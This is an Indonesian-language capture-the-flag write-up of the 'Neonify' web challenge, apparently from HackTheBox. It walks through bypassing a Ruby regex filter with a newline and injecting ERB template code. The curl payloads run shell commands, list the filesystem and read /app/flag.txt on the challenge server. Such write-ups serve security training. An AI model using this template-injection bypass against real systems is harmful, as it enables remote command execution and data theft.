# Neonify

Target	= 188.166.175.58
IP		= 32762

Jika kita buka websitenya, terlihat seperti template command injection(?). Kita dapat coba untuk memasukkan input, namun hampir semua tidak membuahkan hasil, meskipun sudah menggunakan url encoding. Untuk itu kita dapat langsung cek ke file download. Jika kita cek, kita akan menemukan bahwa web ini menggunakan `ruby`. Wow... sesuatu yang baru untuk saya ;)

Jika kita cek source code di `web_neonify/challenge/app/controllers/neon.rb`, kita akan menemukan bahwa website ini menerapkan filter pada server side.
```ruby
class NeonControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    @neon = "Glow With The Flow"
    erb :'index'
  end

  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end

end
```
Dari code diatas, dapat dilihat bahwa filter input menggunakan regex yang mana hanya menerima input alphanumeric saja, dan jika tidak lolos filter, maka akan keluar output `"Malicious Input Detected"`. Selanjutnya jika input yang kita masukkan lolos dari filter, maka input tersebut akan di teruskan ke `index.erb`
```ruby
<!DOCTYPE html>
<html>
<head>
    <title>Neonify</title>
    <link rel="stylesheet" href="stylesheets/style.css">
    <link rel="icon" type="image/gif" href="/images/gem.gif">
</head>
<body>
    <div class="wrapper">
        <h1 class="title">Amazing Neonify Generator</h1>
        <form action="/" method="post">
            <p>Enter Text to Neonify</p><br>
            <input type="text" name="neon" value="">
            <input type="submit" value="Submit">
        </form>
        <h1 class="glow"><%= @neon %></h1>
    </div>
</body>
</html>
```
Input yang lolos filter, akan dimasukkan ke `<h1 class="glow"><%= @neon %></h1>`, contoh jika kita melakukan input "testing", maka nantinya akan dipassing ke `index.erb` menjadi seperti berikut `<h1 class="glow"><%= @neon=testing %></h1>`. Untuk itu kita dapat melakukan bypass, kita dapat menggunakan SSTI (Server Side Template Injection) yang ada di internet. Dalam hal ini, kita akan mencoba bypass dengan ``<%= `ls /` %>``. Disini saya akan menggunakan `curl` untuk mengirimkan request.
```bash
curl http://target:port -d '<%= `ls /` %>'
...
Invalid query parameters: invalid %-encoding (&amp;lt;%)
```
Oke, tentunya perlu url encoding :D
```bash
curl http://188.166.175.58:32762/ -d '%27%3C%25%3D%20%60ls%20%2F%60%20%25%3E%27'
...
        <h1 class="glow">Malicious Input Detected</h1>
    </div>
</body>
</html>
```
Hmmm, terdeteksi malicious input. Hal ini terjadi karena variabel `neon` mendapat passing input original ini ``<%= `ls /` %>``, untuk dapat bypass, kita dapat menggunakan new line (tapi bukan `\n`) setelah memmberi input value pada variabel `neon`. Sehingga, nantinya akan seperti ini
```ruby
        <h1 class="glow"><%= neon=a
<%= `ls /` %>%>
</h1>
```
Sehingga, jika kita terapkan akan seperti berikut
```bash
curl http://188.166.175.58:32762/ -d 'neon=a                                
%27%3C%25%3D%20%60ls%20%2F%60%20%25%3E%27'
...
...
        </form>
        <h1 class="glow">
'app
bin
dev
etc
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
'</h1>
    </div>
</body>
</html>
```
Ohohoho, berhasil :D. Selanjutnya, untuk mencari flag, kita dapat menggunakan command ``<%= `find / 2>/dev/null | grep -i flag` %>``, tentunya URL encoded.
```bash
curl http://188.166.175.58:32762/ -d 'neon=a
%3C%25%3D%20%60find%20%2F%202%3E%2Fdev%2Fnull%20%7C%20grep%20%2Di%20flag%60%20%25%3E'
...
...
<h1 class="glow">a
/usr/local/lib/ruby/2.7.0/bundler/feature_flag.rb
/usr/local/lib/ruby/2.7.0/racc/debugflags.rb
/usr/include/asm/processor-flags.h
/usr/include/linux/tty_flags.h
/usr/include/linux/kernel-page-flags.h
/sys/devices/pnp0/00:00/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/app/flag.txt
</h1>
...
```
Dari banyak "flag" yang tertangkap, yang paling memungkinkan jadi flag asli adalah `/app/flag.txt`, kita dapat langsung mencobanya
```bash
curl http://188.166.175.58:32762/ -d 'neon=a        
%3C%25%3D%20%60cat%20%2Fapp%2Fflag%2Etxt%60%20%25%3E'
...
...
<h1 class="glow">a
HTB{xxx}</h1>
    </div>
```
Benar hehe :D.
Selamat Mencoba.